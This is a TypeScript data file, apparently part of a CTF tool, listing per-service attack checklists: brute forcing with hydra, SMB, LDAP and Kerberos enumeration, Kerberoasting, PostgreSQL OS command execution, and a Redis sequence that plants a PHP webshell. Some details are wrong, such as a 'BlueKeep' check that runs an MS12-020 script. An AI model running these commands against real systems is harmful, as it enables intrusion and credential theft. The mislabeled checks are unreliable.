import type { ServiceProfile } from './ctf-service-checklists';

export const SERVICE_DB: Record<string, ServiceProfile> = {

  ssh: {
    summary: 'SSH is generally "credential" focused.',
    checklist: [
      {
        label: 'Banner Grabbing',
        description: 'Verify the version and check if there is a known vulnerability.',
        commands: ['nc -vn $RHOST 22', 'searchsploit OpenSSH'],
      },
      {
        label: 'Brute Force',
        description: 'If you have a username list, start a dictionary attack with hydra.',
        commands: ['hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$RHOST'],
      },
      {
        label: 'Key Audit',
        description: 'Scan for weak algorithms and old key types using ssh-audit.',
        commands: ['ssh-audit $RHOST'],
      },
      {
        label: 'Public Key Leak',
        description: 'Check if an .id_rsa, authorized_keys, or config file has leaked on other services (e.g., Port 80).',
        commands: ['curl http://$RHOST/.ssh/id_rsa', 'curl http://$RHOST/.ssh/authorized_keys'],
      },
      {
        label: 'Username Enumeration',
        description: 'OpenSSH versions < 7.7 may have a username enumeration vulnerability (CVE-2018-15473).',
        commands: ['searchsploit openssh enum', 'python3 ssh_enum.py $RHOST --userlist users.txt'],
      },
    ],
  },

  http: {
    summary: 'Web service detected. This is generally the most critical attack surface in CTFs!',
    checklist: [
      {
        label: 'Directory Fuzzing',
        description: 'Find hidden directories and files.',
        commands: [
          'ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$RHOST/FUZZ -mc 200,301,302,403',
          'gobuster dir -u http://$RHOST -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak',
          'feroxbuster -u http://$RHOST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
        ],
      },
      {
        label: 'Technology Stack',
        description: 'Identify the backing framework, CMS, and programming language.',
        commands: [
          'whatweb http://$RHOST',
          'curl -s -I http://$RHOST',
          'wappalyzer http://$RHOST',
        ],
      },
      {
        label: 'App / CMS Identification',
        description: 'Check the page title, login panel, or footer information. Is it a known CMS/application?',
        commands: [
          'curl -s http://$RHOST | grep -i "title\\|powered by\\|generator"',
          'nikto -h http://$RHOST',
        ],
      },
      {
        label: 'Subdomain Enumeration',
        description: 'If a domain is defined, scan for subdomains.',
        commands: [
          'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$RHOST -H "Host: FUZZ.$RHOST" -mc 200 -fs <default_size>',
          'gobuster vhost -u http://$RHOST -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
        ],
      },
      {
        label: 'Source Code Review',
        description: 'Inspect the page source, JavaScript files, and HTML comments.',
        commands: [
          'curl -s http://$RHOST | grep -i "<!--\\|TODO\\|FIXME\\|password\\|secret\\|api"',
          'curl -s http://$RHOST/robots.txt',
          'curl -s http://$RHOST/sitemap.xml',
        ],
      },
      {
        label: 'Parameter Fuzzing',
        description: 'Discover GET/POST parameters.',
        commands: [
          'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$RHOST/?FUZZ=test" -mc 200',
          'arjun -u http://$RHOST',
        ],
      },
      {
        label: 'Vulnerability Scan',
        description: 'Run automated vulnerability scanners.',
        commands: [
          'nikto -h http://$RHOST',
          'nuclei -u http://$RHOST -t cves/',
        ],
      },
      {
        label: 'Default / Weak Credentials',
        description: 'If there is a login panel, try default credentials (admin:admin, admin:password, etc.).',
      },
    ],
  },

  https: {
    summary: 'HTTPS (SSL/TLS) service detected. Certificate information can provide subdomain and hostname hints.',
    checklist: [
      {
        label: 'SSL/TLS Certificate Inspection',
        description: 'The CN (Common Name) and SAN (Subject Alt Names) fields in the certificate might contain hidden hostnames/subdomains.',
        commands: [
          'openssl s_client -connect $RHOST:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "CN=|DNS:"',
          'sslscan $RHOST',
        ],
      },
      {
        label: 'SSL Vulnerability Check',
        description: 'Check for known SSL vulnerabilities like Heartbleed, POODLE, BEAST.',
        commands: [
          'testssl.sh $RHOST',
          'nmap --script ssl-heartbleed -p 443 $RHOST',
        ],
      },
      {
        label: 'Directory Fuzzing (HTTPS)',
        description: 'Scan for hidden directories over HTTPS.',
        commands: [
          'ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://$RHOST/FUZZ -mc 200,301,302,403',
          'gobuster dir -u https://$RHOST -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k',
        ],
      },
      {
        label: 'Technology Stack',
        description: 'Identify the framework and server behind HTTPS.',
        commands: ['whatweb https://$RHOST', 'curl -sk -I https://$RHOST'],
      },
    ],
  },

  ftp: {
    summary: 'FTP service detected. Check for anonymous login and file leaks.',
    checklist: [
      {
        label: 'Anonymous Login',
        description: 'Check if anonymous login (anonymous:anonymous) is possible.',
        commands: ['ftp $RHOST', '# Username: anonymous  Password: anonymous'],
      },
      {
        label: 'Banner & Version Check',
        description: 'Check the FTP version and search for known vulnerabilities.',
        commands: ['nc -vn $RHOST 21', 'searchsploit vsftpd', 'searchsploit proftpd'],
      },
      {
        label: 'File Listing & Download',
        description: 'List all files, including hidden ones. Download important files.',
        commands: ['ftp> ls -la', 'ftp> binary', 'ftp> mget *', 'wget -r ftp://anonymous:anonymous@$RHOST/'],
      },
      {
        label: 'Write Permission',
        description: 'Is there write permission? Can a webshell or reverse shell be uploaded?',
        commands: ['ftp> put test.txt'],
      },
      {
        label: 'Brute Force',
        description: 'If the username is known, try to crack the FTP password.',
        commands: ['hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$RHOST'],
      },
    ],
  },

  smb: {
    summary: 'SMB/Samba service detected. Shared folders and user information can be leaked.',
    checklist: [
      {
        label: 'Share Enumeration',
        description: 'List shared folders using a null session.',
        commands: [
          'smbclient -N -L //$RHOST',
          'smbmap -H $RHOST',
          'smbmap -H $RHOST -u "" -p ""',
          'crackmapexec smb $RHOST --shares',
        ],
      },
      {
        label: 'User Enumeration',
        description: 'List users on the system.',
        commands: [
          'enum4linux -a $RHOST',
          'rpcclient -U "" -N $RHOST -c "enumdomusers"',
          'crackmapexec smb $RHOST --users',
        ],
      },
      {
        label: 'Access Shares',
        description: 'Connect to readable folders and inspect files.',
        commands: [
          'smbclient //$RHOST/<share_name> -N',
          'smbget -R smb://$RHOST/<share_name>',
        ],
      },
      {
        label: 'Vulnerability Check',
        description: 'Check for EternalBlue (MS17-010) and other SMB vulnerabilities.',
        commands: [
          'nmap --script smb-vuln* -p 445 $RHOST',
          'searchsploit samba',
        ],
      },
      {
        label: 'Brute Force',
        description: 'Try passwords with known users.',
        commands: ['crackmapexec smb $RHOST -u users.txt -p /usr/share/wordlists/rockyou.txt'],
      },
    ],
  },

  mysql: {
    summary: 'MySQL database service detected. Remote access and weak passwords should be checked.',
    checklist: [
      {
        label: 'Remote Login',
        description: 'Try logging in with default/weak credentials (root:"", root:root, root:toor).',
        commands: ['mysql -h $RHOST -u root -p', 'mysql -h $RHOST -u root'],
      },
      {
        label: 'Nmap Scripts',
        description: 'Run MySQL NSE scripts.',
        commands: [
          'nmap --script mysql-info,mysql-enum,mysql-databases,mysql-brute -p 3306 $RHOST',
        ],
      },
      {
        label: 'Brute Force',
        description: 'Brute force MySQL accounts.',
        commands: ['hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$RHOST'],
      },
      {
        label: 'UDF Exploitation',
        description: 'If login is successful, execute commands via User Defined Functions (UDF).',
        commands: ['searchsploit mysql udf'],
      },
      {
        label: 'Data Exfiltration',
        description: 'List databases, tables, and sensitive data (credentials).',
        commands: [
          'mysql> SHOW DATABASES;',
          'mysql> SELECT user,password FROM mysql.user;',
        ],
      },
    ],
  },

  postgresql: {
    summary: 'PostgreSQL database service detected.',
    checklist: [
      {
        label: 'Remote Login',
        description: 'Try logging in with default credentials (postgres:postgres).',
        commands: ['psql -h $RHOST -U postgres -W'],
      },
      {
        label: 'Command Execution',
        description: 'Execute OS commands via PostgreSQL.',
        commands: [
          "postgres=# COPY (SELECT '') TO PROGRAM 'id';",
          "postgres=# DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';",
        ],
      },
      {
        label: 'File Read',
        description: 'Read files on the server.',
        commands: ["postgres=# SELECT pg_read_file('/etc/passwd');"],
      },
      {
        label: 'Brute Force',
        description: 'Brute force PostgreSQL accounts.',
        commands: ['hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://$RHOST'],
      },
    ],
  },

  redis: {
    summary: 'Redis service detected. It is often accessible without authentication!',
    checklist: [
      {
        label: 'Unauthenticated Access',
        description: 'Check if unauthenticated access is possible.',
        commands: ['redis-cli -h $RHOST', 'redis-cli -h $RHOST INFO'],
      },
      {
        label: 'Data Dumping',
        description: 'List all key/value pairs, search for sensitive data.',
        commands: ['redis-cli -h $RHOST KEYS "*"', 'redis-cli -h $RHOST GET <key>'],
      },
      {
        label: 'SSH Key Write (Webshell)',
        description: 'Gain access by writing to the SSH authorized_keys file via Redis.',
        commands: [
          'redis-cli -h $RHOST CONFIG SET dir /var/lib/redis/.ssh',
          'redis-cli -h $RHOST CONFIG SET dbfilename authorized_keys',
        ],
      },
      {
        label: 'Webshell Write',
        description: 'Write a webshell to the web root directory.',
        commands: [
          'redis-cli -h $RHOST CONFIG SET dir /var/www/html',
          'redis-cli -h $RHOST SET shell "<?php system($_GET[\'cmd\']); ?>"',
          'redis-cli -h $RHOST CONFIG SET dbfilename shell.php',
          'redis-cli -h $RHOST SAVE',
        ],
      },
    ],
  },

  dns: {
    summary: 'DNS service detected. Try zone transfer and subdomain enumeration.',
    checklist: [
      {
        label: 'Zone Transfer (AXFR)',
        description: 'Fetch all records via DNS zone transfer.',
        commands: ['dig axfr @$RHOST <domain>', 'host -t axfr <domain> $RHOST'],
      },
      {
        label: 'Reverse Lookup',
        description: 'Resolve hostname from IP address.',
        commands: ['dig -x $RHOST @$RHOST', 'nslookup $RHOST $RHOST'],
      },
      {
        label: 'Subdomain Brute Force',
        description: 'Perform subdomain discovery via DNS.',
        commands: ['dnsenum --dnsserver $RHOST <domain>', 'gobuster dns -d <domain> -w subdomains.txt -r $RHOST'],
      },
      {
        label: 'Service Records',
        description: 'Query specific DNS records like SRV, MX, TXT.',
        commands: ['dig any @$RHOST <domain>', 'dig srv @$RHOST _kerberos._tcp.<domain>'],
      },
    ],
  },

  smtp: {
    summary: 'SMTP (email) service detected. User enumeration and relay checks should be performed.',
    checklist: [
      {
        label: 'User Enumeration (VRFY/EXPN)',
        description: 'Find valid users with VRFY/EXPN commands.',
        commands: [
          'smtp-user-enum -M VRFY -U users.txt -t $RHOST',
          'nmap --script smtp-enum-users -p 25 $RHOST',
        ],
      },
      {
        label: 'Open Relay Check',
        description: 'Check if the SMTP server is an open relay.',
        commands: ['nmap --script smtp-open-relay -p 25 $RHOST'],
      },
      {
        label: 'Banner Grabbing',
        description: 'Grab the SMTP banner and check the version.',
        commands: ['nc -vn $RHOST 25', 'telnet $RHOST 25'],
      },
      {
        label: 'Vulnerability Check',
        description: 'Search for known SMTP vulnerabilities.',
        commands: ['searchsploit postfix', 'searchsploit exim', 'searchsploit sendmail'],
      },
    ],
  },

  rdp: {
    summary: 'RDP (Remote Desktop) service detected.',
    checklist: [
      {
        label: 'NLA Check',
        description: 'Check if Network Level Authentication is active.',
        commands: ['nmap --script rdp-ntlm-info -p 3389 $RHOST'],
      },
      {
        label: 'BlueKeep Check',
        description: 'Check for CVE-2019-0708 (BlueKeep) vulnerability.',
        commands: ['nmap --script rdp-vuln-ms12-020 -p 3389 $RHOST'],
      },
      {
        label: 'Brute Force',
        description: 'Brute force RDP accounts.',
        commands: ['hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://$RHOST', 'crowbar -b rdp -s $RHOST/32 -u admin -C rockyou.txt'],
      },
      {
        label: 'Connect',
        description: 'Connect if you have credentials.',
        commands: ['xfreerdp /v:$RHOST /u:admin /p:password +clipboard /dynamic-resolution'],
      },
    ],
  },

  telnet: {
    summary: 'Telnet service detected. Unencrypted communication — cleartext credentials can be intercepted.',
    checklist: [
      {
        label: 'Banner Grabbing',
        description: 'Grab the banner, it might leak device/OS information.',
        commands: ['telnet $RHOST', 'nc -vn $RHOST 23'],
      },
      {
        label: 'Default Credentials',
        description: 'Try logging in with default credentials (admin:admin, root:root).',
      },
      {
        label: 'Brute Force',
        description: 'Brute force Telnet accounts.',
        commands: ['hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://$RHOST'],
      },
    ],
  },

  vnc: {
    summary: 'VNC service detected. Weak or unauthenticated access is often possible.',
    checklist: [
      {
        label: 'Authentication Check',
        description: 'Check if unauthenticated access is possible.',
        commands: ['vncviewer $RHOST'],
      },
      {
        label: 'Brute Force',
        description: 'Brute force the VNC password.',
        commands: [
          'hydra -s 5900 -P /usr/share/wordlists/rockyou.txt $RHOST vnc',
          'nmap --script vnc-brute -p 5900 $RHOST',
        ],
      },
      {
        label: 'Credential File',
        description: 'If a .vnc/passwd file was found, decrypt the password.',
        commands: ['vncpwd <password_file>'],
      },
    ],
  },

  ldap: {
    summary: 'LDAP service detected. Critical information can be leaked in an Active Directory environment.',
    checklist: [
      {
        label: 'Anonymous Bind',
        description: 'Check if anonymous LDAP queries are allowed.',
        commands: [
          'ldapsearch -x -H ldap://$RHOST -b "dc=<domain>,dc=<tld>" -s sub "(objectclass=*)"',
          'nmap --script ldap-rootdse -p 389 $RHOST',
        ],
      },
      {
        label: 'User Enumeration',
        description: 'Extract the user list via LDAP.',
        commands: ['ldapsearch -x -H ldap://$RHOST -b "dc=<domain>,dc=<tld>" "(objectClass=person)" sAMAccountName'],
      },
      {
        label: 'Password in Description',
        description: 'Search for password hints in the descriptions of users.',
        commands: ['ldapsearch -x -H ldap://$RHOST -b "dc=<domain>,dc=<tld>" "(objectClass=person)" description'],
      },
    ],
  },

  nfs: {
    summary: 'NFS service detected. Exposed directories can be mounted.',
    checklist: [
      {
        label: 'Share Listing',
        description: 'List publicly accessible NFS shares.',
        commands: ['showmount -e $RHOST', 'nmap --script nfs-ls,nfs-showmount -p 2049 $RHOST'],
      },
      {
        label: 'Mount & Inspect',
        description: 'Mount the shared directory and inspect files.',
        commands: ['mkdir /tmp/nfs && mount -t nfs $RHOST:/<share> /tmp/nfs', 'ls -la /tmp/nfs'],
      },
      {
        label: 'UID Manipulation',
        description: 'NFS uses UID-based authorization. Access can be gained by changing the local UID.',
      },
    ],
  },

  kerberos: {
    summary: 'Kerberos service detected. User and ticket attacks can be performed in an Active Directory environment.',
    checklist: [
      {
        label: 'User Enumeration',
        description: 'Find valid users via Kerberos pre-authentication.',
        commands: ['kerbrute userenum -d <domain> --dc $RHOST users.txt'],
      },
      {
        label: 'ASREPRoasting',
        description: 'Retrieve and crack hashes of accounts with pre-auth disabled.',
        commands: [
          'GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip $RHOST -format hashcat',
          'hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt',
        ],
      },
      {
        label: 'Kerberoasting',
        description: 'Retrieve and crack tickets for service accounts with SPNs.',
        commands: [
          'GetUserSPNs.py <domain>/<user>:<pass> -dc-ip $RHOST -request',
          'hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt',
        ],
      },
    ],
  },
};
